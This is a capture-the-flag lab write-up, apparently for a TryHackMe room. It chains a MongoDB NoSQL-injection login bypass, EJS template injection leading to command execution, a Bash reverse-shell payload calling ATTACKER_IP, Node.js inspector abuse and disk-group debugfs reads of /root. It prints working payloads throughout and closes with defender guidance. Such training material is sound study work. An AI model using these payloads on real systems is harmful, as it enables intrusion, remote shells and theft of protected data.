2 NoSQL Injection — Authentication Bypass

2.1 Understanding the Vulnerability

When you submit a login form on an Express + MongoDB application, the backend typically constructs a query like this:

Vulnerable Backend Logic (Simplified)
db.users.findOne({
    username: req.body.username,
    password: req.body.password
})

If req.body.password is passed as an object instead of a string, MongoDB interprets its keys as query operators. By sending:

Malicious POST Body
username=attendant&password[$ne]=x

The query becomes:

Resulting MongoDB Query
db.users.findOne({
    username: "attendant",
    password: { "$ne": "x" }
})

$ne means "not equal". This query finds a user named "attendant" whose password is not "x" — which will be true for any password except literally "x". MongoDB happily returns the user document, and the application sets a session cookie, believing authentication succeeded.

2.2 Execution

We navigate to the login page at http://10.113.129.141/. The placeholder in the username field reveals the username: attendant. We enter:

  • Username: attendant
  • Password: password[$ne]=x

The browser URL-encodes the brackets automatically when submitting via a form. Upon submission, the server responds with a 302 redirect to /staff and sets a session cookie:

Response Headers
HTTP/1.1 302 Found
Location: /staff
Set-Cookie: connect.sid=s%3A3osxiFYKF-AFBJ4Zp1wUoDAS5sMyidQT.H5uoq4TqyLZNfUsJS6dv6FGOCAJce8OZ5fLTlqe6r78; Path=/; HttpOnly
✅ Authentication bypassed. We now have a valid connect.sid session cookie belonging to the "attendant" user. The HttpOnly flag prevents JavaScript from reading the cookie (mitigating XSS-based theft), but we can simply set it manually in our browser.

2.3 Accessing the Staff Portal

We navigate to /staff and use browser developer tools (or a cookie manager extension) to add the captured cookie:

  • Name: connect.sid
  • Value: s%3A3osxiFYKF-AFBJ4Zp1wUoDAS5sMyidQT.H5uoq4TqyLZNfUsJS6dv6FGOCAJce8OZ5fLTlqe6r78

The /staff endpoint renders a dashboard: "Cabana Desk — Signed in as attendant." There's a template editor with EJS:

Staff Dashboard — EJS Template Editor

🧠 Attacker's Thought Process: EJS (Embedded JavaScript) is a templating engine that executes JavaScript between <% %> tags. The guest parameter is user-controlled through the URL query string (?guest=poolside). If the application passes this directly into the template without sanitisation, we have Server-Side Template Injection (SSTI) — a vulnerability that can lead to Remote Code Execution (RCE).

3 EJS Server-Side Template Injection → RCE

3.1 Confirming SSTI

We first test by passing a simple JavaScript arithmetic expression to the guest parameter. If EJS evaluates it, the result will appear in the rendered output.

SSTI Test Payload
?guest=<%= 7*7 %>

The page renders: "Dear 49, your Byte Lotus cabana is confirmed." — SSTI confirmed.

3.2 Escalating to Remote Code Execution

EJS provides access to the Node.js process global object through its template context. We can call child_process.execSync() to execute system commands. The <%- %> syntax outputs unescaped raw content (needed for command output).

RCE Payload — Check Current User
?guest=<%- global.process.mainModule.require('child_process').execSync('whoami') %>
Dear poolside, your Byte Lotus cabana is confirmed.

We are running as the poolside user. We now have command execution on the target.

List Home Directory

3.4 Establishing a Reverse Shell

While we could continue using blind RCE through the template, a proper reverse shell gives us an interactive terminal, which is far more efficient for privilege escalation. We set up a Netcat listener on our attack machine and execute a Bash reverse shell payload.

Attack Machine — Netcat Listener
nc -lvnp 4321
Reverse Shell Payload (via guest parameter)
?guest=<%- global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4321 0>&1"') %>

A connection is received. We upgrade to a pseudo-TTY for a fully functional shell:

Shell Upgrade

4 Lateral Movement — Node.js Inspector Abuse

4.1 Discovery

During enumeration of the filesystem, we discover an interesting directory: /opt/pipelinesvc/telemetry/. Inside is a Node.js script:

File: /opt/pipelinesvc/telemetry/processor.js
'use strict';
const os = require('os');

let ticks = 0;

function processBatch() {
  ticks += 1;
  const load = os.loadavg()[0].toFixed(2);
  if (ticks % 12 === 0) {
    console.log(`[telemetry] ${new Date().toISOString()} batches=${ticks} load=${load}`);
  }
}

console.log('lotus-telemetry occupancy processor started');
setInterval(processBatch, 5000);
process.stdin.resume();

This appears to be a system telemetry service. Let's check if it's actually running and how it was launched:

Process Discovery — Two Approaches
# Approach 1: Standard ps + grep (MISSES the process!)
ps aux | grep telemetry
# Returns nothing useful — grep only matches process NAMES, not script arguments

# Approach 2: pgrep with full command-line matching (CORRECT!)
pgrep -af 'processor.js|telemetry'
600 /usr/bin/node --inspect=127.0.0.1:9229 processor.js
🧠 Why did ps aux | grep fail? grep telemetry looks for the word "telemetry" in the truncated process name column — but the process is just /usr/bin/node. The script name "processor.js" and the path "telemetry" only appear in the full command line (the arguments). pgrep -af (-f for full command, -a for showing it) matches against the entire command string, which is how we caught the critical --inspect flag. This is a common enumeration pitfall — always use pgrep -af when hunting for specific scripts.

4.2 Understanding the --inspect Flag

The process was started with:

Process Command Line
/usr/bin/node --inspect=127.0.0.1:9229 processor.js

Node.js's --inspect flag enables the V8 Inspector Protocol, which is the same debugging interface used by Chrome DevTools. It opens a WebSocket-based debugger on port 9229. Anyone who can connect to this port can execute arbitrary JavaScript in the context of the running process.

The process is bound to 127.0.0.1 (localhost), so it's only accessible from the box itself — but we already have a shell as poolside, so that's not a barrier.

4.3 Connecting to the Debugger

We use Node.js's built-in inspect command to attach to the debugger and drop into a REPL (Read-Eval-Print Loop):

Connecting to the Node.js Inspector
node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok debug> repl Press Ctrl+C to leave debug repl >

We are now in a JavaScript REPL inside the running processor.js process.

4.4 Executing Commands in the Debugger Context

Inside the debugger REPL, require is not directly available (it's not a global in the debugger's evaluation context). However, we can access it through process.mainModule.require:

Debugger REPL — Who Are We?
process.mainModule.require('child_process').execSync('whoami').toString()
'pipelinesvc\n'
✅ Lateral movement achieved. The telemetry process runs as pipelinesvc, a different (and likely more privileged) user. We now have code execution in that user's context.

5 Privilege Escalation — disk Group → debugfs

5.1 Enumerating pipelinesvc's Privileges

Now operating as pipelinesvc, we check group memberships:

Debugger REPL — Group Membership
process.mainModule.require('child_process').execSync('groups pipelinesvc').toString()
'pipelinesvc : pipelinesvc disk\n'

Critical finding: pipelinesvc is a member of the disk group. This group has raw read/write access to block devices (/dev/sda, /dev/nvme0n1, etc.). This is effectively equivalent to root access because we can bypass the filesystem permission model entirely.

5.2 Identifying the Block Device

We need to find the actual block device backing the root filesystem:

Debugger REPL — List Block Devices
process.mainModule.require('child_process').execSync('lsblk').toString()
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS nvme1n1 259:0 0 1G 0 disk nvme0n1 259:1 0 20G 0 disk └─nvme0n1p1 259:2 0 20G 0 part /

The root filesystem lives on /dev/nvme0n1p1 (partition 1 of the NVMe drive). The raw disk is /dev/nvme0n1.

5.3 Attempting to Read the Root Flag — Three Approaches

The root flag is located at /root/root.txt. We try three different methods to access it:

Approach 1 — Direct cat (Fails):

Attempt 1: Direct File Read
process.mainModule.require('child_process').execSync('cat /root/root.txt 2>/dev/null || echo "direct read failed"').toString()
direct read failed

Why it fails: Although we're in the disk group, the mounted filesystem still enforces standard Unix permissions. The /root directory has permissions drwx------ (700), meaning only root can traverse it. The kernel's VFS (Virtual File System) layer checks these permissions on every file access through normal system calls — disk group membership doesn't bypass this layer.

Approach 2 — strings on Raw Disk (Fails):

Attempt 2: Grepping Raw Disk with strings
process.mainModule.require('child_process').execSync('bash -c "strings /dev/nvme0n1 2>/dev/null | grep -i \'THM{\' | head -5"').toString()
(empty — no output)

Why it fails: strings scans the raw 20GB disk looking for sequences of printable characters. The flag file is a tiny text file stored inside the ext4 filesystem on the partition. On disk, files are split across blocks scattered throughout the drive. The flag text may be fragmented, never appearing as a contiguous printable sequence that strings can capture. Additionally, searching 20GB of raw data — including binaries, libraries, logs, and filesystem metadata — generates enormous noise. The flag simply gets lost in it all.

Approach 3 — debugfs Raw Filesystem Read (Success):

Attempt 3: debugfs Bypassing Filesystem Permissions
process.mainModule.require('child_process').execSync('bash -c "debugfs /dev/nvme0n1p1 -R \'cat /root/root.txt\' 2>/dev/null"').toString()
THM{r4w_d1sk_4cc3ss_w4s_t00_much}

5.4 Why debugfs Works When Everything Else Fails

This is the educational heart of the room. Let's break down exactly what's happening under the hood.

What is debugfs?
debugfs is an ext2/ext3/ext4 filesystem debugger. It's designed for low-level filesystem inspection and repair. Unlike cat, ls, or any normal file operation, debugfs does not go through the kernel's VFS (Virtual File System) layer. Instead, it reads the raw block device directly — interpreting inodes, directory entries, and data blocks from the raw bytes on disk.

Why does the disk group matter?
Let's check the permissions on the block device:

Block Device Permissions
ls -la /dev/nvme0n1p1
brw-rw---- 1 root disk 259, 2 Aug  4 21:03 /dev/nvme0n1p1

The device file has group ownership disk with read/write permissions for the group (rw-). Since pipelinesvc is a member of the disk group, it has raw read access to the entire partition — every block, every inode, every byte. The kernel allows the open() system call on the device file because the group permission check passes.

The bypass explained, step by step:
When debugfs opens /dev/nvme0n1p1, it reads the filesystem purely as a data structure:

  1. It reads the superblock to understand the filesystem layout — block size, inode count, journal location, etc.
  2. It locates the root inode (always inode 2 on ext4) to find the root directory's data blocks
  3. It traverses directory entries to find root.txt's inode number — directory entries are just lists of (name, inode) pairs
  4. It reads the inode for root.txt to get the list of data blocks that hold the file's contents
  5. It reads those data blocks directly and outputs the contents

At no point in this process does debugfs check:

  • File ownership (chown)
  • File permissions (chmod rwx------)
  • Directory permissions on /root
  • Access Control Lists (ACLs)
  • Any extended attributes or SELinux contexts

The filesystem's permission model is a kernel-enforced construct that lives in the VFS layer. By bypassing the kernel entirely and reading the disk directly, debugfs sidesteps the entire security model. This is why disk group membership is effectively root-equivalent — it grants unfiltered, raw access to every file on the system regardless of ownership or permissions.

Why the strings approach failed — the deeper explanation:
When a file is stored on an ext4 filesystem, its data is split into blocks (typically 4KB each). These blocks are not guaranteed to be contiguous on disk. A 100-byte text file like root.txt fits in a single block, but that block could be located anywhere within the 20GB partition — next to a kernel binary, between log file fragments, or in the middle of a deleted JPEG. strings scans sequentially through the entire disk extracting runs of printable characters. It has no concept of filesystem structure — it doesn't know which blocks belong to which files, nor does it understand inodes or directory hierarchies. Even if the flag bytes exist on disk, strings would see them as just another random string among millions, indistinguishable from all the other text fragments extracted from binaries, configuration files, and system logs scattered across 20GB of raw storage.

debugfs, by contrast, understands the ext4 data structures intimately. It reads the inode table, finds the exact block numbers allocated to root.txt, and assembles them in the correct order — guaranteeing the file contents are reconstructed perfectly, every time.

📚 Lessons Learned

This room teaches a powerful privilege escalation chain that combines multiple vulnerabilities and misconfigurations into a complete attack path. Here's the full breakdown:

Stage Technique Vulnerability Impact
1. Initial Access NoSQL Injection Unsanitised user input in MongoDB query Authentication bypass
2. Code Execution EJS SSTI User-controlled input in server-side template Remote Code Execution
3. Lateral Movement Node.js --inspect Abuse Debugger flag left enabled in production Escalation to pipelinesvc
4. Privilege Escalation disk Group + debugfs Excessive group membership + raw device access Full filesystem read → Root flag

🛡️ For Defenders

  • Sanitise database inputs. Always type-check and validate user input before passing it to database queries. Use parameterised queries or an ODM/ORM (like Mongoose for MongoDB) with strict schemas that reject unexpected object structures.
  • Never trust template input. Pass user-controlled data into templates as variables, never as raw template code. Use sandboxed template engines or disable dangerous features like raw output (<%- %>) and require access in production.
  • Disable debuggers in production. The --inspect flag is a development feature. It should never be present on production services. Use environment-specific startup scripts or process managers that strip debug flags in production environments.
  • Audit group memberships. The disk group is extremely powerful — treat it with the same caution as sudo or docker group access. Regularly audit /etc/group and remove unnecessary memberships. Consider using filesystem encryption (LUKS/dm-crypt) so that raw disk access doesn't expose plaintext data.
  • Apply the principle of least privilege. The pipelinesvc user had no legitimate reason to be in the disk group. Every unnecessary permission is a potential escalation path.

⚔️ For Attackers

  • Reconnaissance is everything. Nmap, Gobuster, and process enumeration (pgrep -af) revealed every step of this chain. Thorough enumeration turns a black box into a clear attack path.
  • The briefing contained real hints. Room flavour text isn't just story — "a wallet signs a transaction its owner didn't authorise" was a direct clue toward NoSQL injection. Always read carefully.
  • pgrep -af catches what ps aux | grep misses. Always check full command lines when hunting running services. The --inspect flag would have been invisible to a standard ps aux pipe.
  • disk group + debugfs is a powerful escalation path. On Linux systems, raw device access is effectively root access. Always check group memberships — disk, adm, docker, lxd are all high-value targets.
  • When one approach fails, understand why. cat failed (permissions), strings failed (no filesystem context). Understanding those failures directly pointed to debugfs — the tool that operates at the right abstraction level. The difference between a good attacker and a great one is understanding why things work or don't.
🧠 The Core Lesson: This room is a perfect illustration of chained exploitation. No single vulnerability gave us root. We combined NoSQL injection, SSTI, an exposed debugger, and excessive group membership into a complete kill chain. In real-world penetration testing, it's rare to find a single silver-bullet vulnerability. Success comes from chaining smaller misconfigurations together — each one widening your access until you reach the objective.
